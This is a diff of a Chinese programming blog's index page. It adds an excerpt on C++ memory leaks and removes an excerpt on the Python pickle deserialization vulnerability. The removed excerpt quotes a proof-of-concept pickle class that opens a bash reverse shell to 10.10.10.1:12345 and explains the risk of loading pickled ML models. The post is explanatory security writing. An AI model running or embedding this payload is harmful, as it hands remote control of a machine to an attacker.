@@ -106,6 +106,84 @@
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <header class="post-header">
       <h1 class="post-title" itemprop="name headline">
+        <a class="post-title-link" href="http://lanlingzi.cn/post/technical/2021/1106/" itemprop="url">
+        飞哥讲代码28：C&#43;&#43;内存泄露
+        </a>
+      </h1>
+      <div class="post-meta">
+      <span class="post-time">
+<span class="post-meta-item-icon">
+    <i class="fa fa-calendar-o"></i>
+</span>
+<span class="post-meta-item-text">时间：</span>
+<time itemprop="dateCreated" datetime="2016-03-22T13:04:35+08:00" content="2021-11-06">
+    2021-11-06
+</time>
+</span> 
+      
+
+  <span class="post-category" >
+  &nbsp; | &nbsp;
+  <span class="post-meta-item-icon">
+    <i class="fa fa-folder-o"></i>
+  </span>
+  <span class="post-meta-item-text">分类：</span>
+  
+    <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+      <a href="http://lanlingzi.cn/categories/%E6%8A%80%E6%9C%AF" itemprop="url" rel="index">
+        <span itemprop="name">技术</span>
+      </a>
+      &nbsp; 
+    </span>
+  
+</span>
+
+
+       <span>
+&nbsp; | &nbsp;
+<span class="post-meta-item-icon">
+    <i class="fa fa-eye"></i>
+</span>
+<span class="post-meta-item-text">阅读：</span>
+<span class="leancloud-visitors-count">4478 字 ~9分钟</span>
+</span>
+      </div>
+    </header>
+    <div class="post-body" itemprop="articleBody">
+    <h1 id="案例">案例</h1>
+<p>C/C++把内存管理交给程序员，由于对象生命周期的长短不一，需要记住内存在真正不需要它的时候显示释放，让程序员承担很大的心智负担，不经意间就出现内存泄露。通常正常的业务流程是不会出现内存泄露的，因为跑用例时会挂上内存检测工具，但一些异常分支，用例难以覆盖的地方，是内存泄露的重灾区。若一旦出现，都难以定位。前一段时间走读某一老产品的代码，是C/C++混合代码，发现一些潜在内存泄露问题。</p>
+<p><strong>问题1</strong>，每个异常分支需要手动释放方法内申请的内存，代码脱敏如下：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">pBuf1 = malloc(<span style="color:#8b008b;font-weight:bold">sizeof</span>(XX1)); <span style="color:#228b22">// 申请一块内存
+</span><span style="color:#228b22"></span><span style="color:#8b008b;font-weight:bold">if</span> (cond1) { <span style="color:#228b22">// 异常分支1
+</span><span style="color:#228b22"></span>    free(pBuf1);
+    <span style="color:#8b008b;font-weight:bold">return</span> RET_ERROR;
+}
+<span style="color:#228b22">// 省略其它代码
+</span><span style="color:#228b22"></span>pBuf2 = malloc(<span style="color:#8b008b;font-weight:bold">sizeof</span>(XX2)); <span style="color:#228b22">// 申请另一块内存
+</span><span style="color:#228b22"></span><span style="color:#8b008b;font-weight:bold">if</span> (cond2) { <span style="color:#228b22">// 异常分支2
+</span><span style="color:#228b22"></span>    free(pBuf1); <span style="color:#228b22">// 每个分支，都要释放前面所有代码
+</span><span style="color:#228b22"></span>    free(pBuf2);
+    <span style="color:#8b008b;font-weight:bold">return</span> RET_ERROR;
+}
+<span style="color:#228b22">// 省略其它代码
+</span><span style="color:#228b22"></span>ptr-&gt;buf1 = pBuf1;  <span style="color:#228b22">// 把多块内存的指针赋值给结构体指针ptr的成员变量，ptr是出参，ptr内存以及它的成员指针内存释放是在其它地方
+</span><span style="color:#228b22"></span>ptr-&gt;buf2 = pBuf2;
+<span style="color:#8b008b;font-weight:bold">return</span> RET_SUCCESS
+</code></pre></div>
+    </div>
+    
+    <div class="post-more-link text-center">
+    <a class="btn" href="http://lanlingzi.cn/post/technical/2021/1106/" rel="contents">
+      阅读全文 &raquo;
+    </a>
+    </div>
+    
+    <footer class="post-footer"><div class="post-eof"></div></footer>
+  </article>
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">
         <a class="post-title-link" href="http://lanlingzi.cn/post/technical/2021/1016/" itemprop="url">
         软件开发漫谈4：敏捷开发
         </a>
@@ -562,85 +640,6 @@
     <footer class="post-footer"><div class="post-eof"></div></footer>
   </article>
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">
-        <a class="post-title-link" href="http://lanlingzi.cn/post/technical/2021/0313_code/" itemprop="url">
-        飞哥讲代码24：从Python Pickle漏洞说起
-        </a>
-      </h1>
-      <div class="post-meta">
-      <span class="post-time">
-<span class="post-meta-item-icon">
-    <i class="fa fa-calendar-o"></i>
-</span>
-<span class="post-meta-item-text">时间：</span>
-<time itemprop="dateCreated" datetime="2016-03-22T13:04:35+08:00" content="2021-03-13">
-    2021-03-13
-</time>
-</span> 
-      
-
-  <span class="post-category" >
-  &nbsp; | &nbsp;
-  <span class="post-meta-item-icon">
-    <i class="fa fa-folder-o"></i>
-  </span>
-  <span class="post-meta-item-text">分类：</span>
-  
-    <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-      <a href="http://lanlingzi.cn/categories/%E6%8A%80%E6%9C%AF" itemprop="url" rel="index">
-        <span itemprop="name">技术</span>
-      </a>
-      &nbsp; 
-    </span>
-  
-</span>
-
-
-       <span>
-&nbsp; | &nbsp;
-<span class="post-meta-item-icon">
-    <i class="fa fa-eye"></i>
-</span>
-<span class="post-meta-item-text">阅读：</span>
-<span class="leancloud-visitors-count">3848 字 ~8分钟</span>
-</span>
-      </div>
-    </header>
-    <div class="post-body" itemprop="articleBody">
-    <blockquote>
-<p>《泾溪》&ndash; 杜荀鹤<br>
-泾溪石险人兢慎，终岁不闻倾覆人。<br>
-却是平流无石处，时时闻说有沉沦。</p>
-</blockquote>
-<h1 id="案例">案例</h1>
-<p>有次同事找我看个Python的安全问题。测试代码是这样的：</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
-<span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">os</span>
-
-<span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Test</span>(<span style="color:#658b00">object</span>):
-    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">__reduce__</span>(self):
-        cmd = <span style="color:#cd5555">&#34;&#34;&#34;bash -i &amp;&gt; /dev/tcp/10.10.10.1/12345 0&gt;&amp;1 2&gt;&amp;1&#34;&#34;&#34;</span>
-        <span style="color:#8b008b;font-weight:bold">return</span> (os.system,(cmd,))
-
-<span style="color:#8b008b;font-weight:bold">if</span> __name__ == <span style="color:#cd5555">&#34;__main__&#34;</span>:
-    test = Test()
-    bs = pickle.dumps(test)
-    pickle.loads(bs)
-</code></pre></div><p>这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。</p>
-<p>目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。</p>
-    </div>
-    
-    <div class="post-more-link text-center">
-    <a class="btn" href="http://lanlingzi.cn/post/technical/2021/0313_code/" rel="contents">
-      阅读全文 &raquo;
-    </a>
-    </div>
-    
-    <footer class="post-footer"><div class="post-eof"></div></footer>
-  </article>
-
 </section>
 
 
@@ -766,7 +765,7 @@
       <nav class="site-state motion-element">
     <div class="site-state-item site-state-posts">
       <a href="http://lanlingzi.cn/post/">
-        <span class="site-state-item-count">155</span>
+        <span class="site-state-item-count">156</span>
         <span class="site-state-item-name">日志</span>
       </a>
     </div>
